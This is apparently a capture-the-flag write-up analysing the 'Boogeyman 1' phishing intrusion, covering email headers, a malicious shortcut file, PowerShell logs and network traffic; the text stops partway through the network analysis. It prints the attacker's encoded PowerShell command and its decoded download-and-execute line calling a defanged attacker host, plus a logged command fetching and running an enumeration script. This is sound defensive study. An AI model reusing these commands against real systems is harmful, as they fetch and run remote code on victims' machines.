# Title: Challenge 3 Write-Up: Boogeyman 1

# Introduction

***Scenario Overview:***  🛡️ ﻿Uncover the secrets of the new emerging threat, the Boogeyman threat actor 

***Objective:***  🔎 Analyze the Tactics, Techniques, and Procedures (TTPs) executed by a threat group, from obtaining initial access until achieving its objective. 

**Environment and Tools Used:** 
- Linux
- jq
- Wireshark
- Tshark
- Thunderbird
- Lnkparser3 
- Linux command line tools such as awk, grep, sed, and base64

**Given Artifacts:**
- copy of a phishing email (dump.eml)
- Powershell Logs from Julianne's Workstation
- Packet Capture From the same workstation (Capture.pcap)

***Goals:***
- Gained familiarity in using Wireshark and TShark to determine if and to which extent is an particular endpoint compromised.  
- Extract TTPs using Wireshark, TShark, and Linux command line tools
- Demonstrate experience in using Wireshark and TShark.
- Demonstrate skill and experience in analyzing a phishing email by analyzing headers and body of the email in the original HTML.


# Start of the Investigation 


### Task 1: Email Analysis 

If we remember from the introduction, we are given an email file (dump.eml) that may include malicious attachments. We can analyze the email using Thunderbird. 
We extract the following information from dump.eml by looking at the headers, message body as original HTML: We make sure to pay close attention to the following sections: DKIM-Signatures, From, To, Received From, Return=Path and any attachments.
Some details gathered: 
- Email address used to send the phishing email: *agriffin@bpakcaging[.]xyz*
- Email Address of victim: *julianne.westcott@hotmail[.]*
- Third-Party mail relay service used: *elasticemail*

*Attachment Analysis*

The attachment included in the suspicious email was identified as Invoice.zip. The full email, including the message body and email headers, was uploaded to a message header analysis tool to provide additional context surrounding the email and its origin.

The attachment was extracted using Thunderbird, revealing an additional file named invoice_20230103.lnk. The email body contained a password required to decrypt/extract the contents of the attachment.

After extracting the .lnk file, LnkParse was used to analyze the shortcut and identify embedded command-line arguments:

``lnkparse Invoice_20230103.lnk``

Analysis of the LnkParse output revealed a suspicious command containing a Base64-encoded PowerShell payload. The presence of PowerShell execution with a hidden window and an encoded command is consistent with techniques commonly used to obfuscate malicious activity.

Observed command:

```nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==```

The encoded argument was decoded using CyberChef's Base64 decoder, followed by removal of the embedded null bytes. This produced the following PowerShell command:

```-nop -windowstyle hidden iex (new-object net.webclient).downloadstring('hxxp://files.bpakcaging[.]xyz/update')```

**Findings**

The decoded payload demonstrates several suspicious behaviors:
 - nop: Attempts to prevent PowerShell profiles from loading.
 - windowstyle hidden: Executes PowerShell with the window hidden from the user.
 - enc: Uses Base64 encoding to obfuscate the PowerShell command within the .lnk file.
 - iex: Invokes Invoke-Expression to execute the retrieved content.
 - Net.WebClient: Creates a web client used to retrieve content from a remote server.
 - DownloadString(): Downloads the contents of the specified URL directly into memory.
 - External URL: hxxp://files.bpakcaging[.]xyz/update

The combination of an email-delivered .lnk file, hidden PowerShell execution, Base64 obfuscation, and retrieval of a remote payload is highly suspicious and indicates that the shortcut was likely intended to serve as an initial execution mechanism for additional malicious code.

<img width="1566" height="163" alt="image" src="https://github.com/user-attachments/assets/c0ca83e7-b6f9-4a36-b9a2-8953572c25aa" />
<img width="1532" height="568" alt="image" src="https://github.com/user-attachments/assets/122198a6-5c5a-4d77-9bab-bd0a5d9fef88" />


### Task 2: Endpoint Security

We now can conclude that the PowerShell command observed in the first task signaled initial execution and compromise of Julianne's workstation. Further actions along the kill chain are most likely after initial access. 
Our supervisor has given us an helpful investigative guide to follow for task 2.
- Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
- Since the given data is JSON, we can parse it in CLI using the jq command.
- Note that some logs are redundant and do not contain any critical information; hence can be ignored.

We will use jq to parse and analyze the PowerShell.json artifact that we are provided. 

First thought process is to look for the suspicious domain found when we decoded the base64 command in task 1. To accomplish this, I used the following command: ```cat powershell.json | jq | grep -i bpakcaging.xyz```. This will simplify results to what we actually want to see, without the grep command, the noise may be too much to sift through comfortably. 

**Findings**
- The attacker reaches out to two likely Command and Control (C2) Servers: *cdn.bpakcaging.xyz && files.bpakcaging.xyz*.

Next, Our supervisor instructs us to find the enumeration tool that the attacker downloads. My initial thought process is to narrow down the results by using the grepping for .downloadstring since we know our attacker uses this method for ingress tool transfer. Command: ```cat powershell.json | jq | grep -i "downloadstring"```

**Findings**
- We get an interesting result of ```"ScriptBlockText": "iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd"```
- Nothing stood out at first for me, but I researched the GitHub repository in the command above, and found out eventually that the enumeration tool was the tool known as *Seatbelt*.

  <img width="886" height="355" alt="image" src="https://github.com/user-attachments/assets/0b68d4c3-7211-4afa-a589-f30b5f8db5a1" />

Next, our supervisor informs us to track down the file accessed by the downloaded *sq3.exe*. 
I isolate the results to anything including the binary: 
```cat powershell.json | jq | grep -i "sq3.exe"``` This commands yields nothing of interests. 
The hint tell us to sort by timestamp in order to piece together the chain of events which should give us the answer, so I run the command ```cat poowershell.json | jq | grep -i "sq3.exe" | jq -s -c 'sort by(.Timestamp) | .[] | {ScriptBlockText}' | grep -v null | grep -v Set-StrickMode``` We clean up the noise by filtering out null and Set-StrictMode events.

 **Findings**
 - The command yields us a suspicous looking line ```{"ScriptBlockText":".\\Music\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite```.
 - That is part of the full file path for the file accessed by sq3.exe.
 - The other part is C:\Users\J.westcott to make the full path: ```C:\\Users\\J.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite```.
 - The file uses the software ```Microsoft Sticky Notes```.
 - Further down in the results, we see that a file ```protceted_data.kdbx``` is exfiltrated to the following location ```167[.]71[.]211[.]113```.
 - The full attack sequence is illustrated in the image below

<img width="1545" height="584" alt="image" src="https://github.com/user-attachments/assets/18d465dd-306b-49b0-b98a-1c15d3daac9d" />

   
### Task 3: Network Traffic Analysis

Concluding Task 3, we now know that the threat actor successfully exfiltrated two potentially sensitive files. The domains and ports used for the exfiltration are also known, as well as the primary tool used.

We now pivot our focus to the packet capture (PCAP) file, where we will use Wireshark and possibly TShark to follow the commands examined in the PowerShell logs and understand the network traffic generated by the attack.

We are given a list of artifacts to find by our supervisor. 

**Artifact Search**

*Question 1: Find the software used by the attacker to host its presumed file/payload server.*
- After uploading the PCAP to Wireshark, we start by applying some filters to lower the noise.
- Remebering that we were able to extract the IP address of the attacker's potential C2 Server ```167[.]71[.]211[.]113``` and that the sequence likely involves http. I craft the following query ```http && ip.addr == 167[.]71[.]211[.]13```.
- Looking at the headers of the request to the malicious IP address, we see that the server is hosted via *Python*.
- **Answer: Python**

<img width="1162" height="554" alt="image" src="https://github.com/user-attachments/assets/cd7ce2b1-23a2-4020-a654-7362253ec595" />
  

*Question 2: What HTTP method is used by the C2 for the output of the commands executed by the attacker?*
- **Answer: POST**




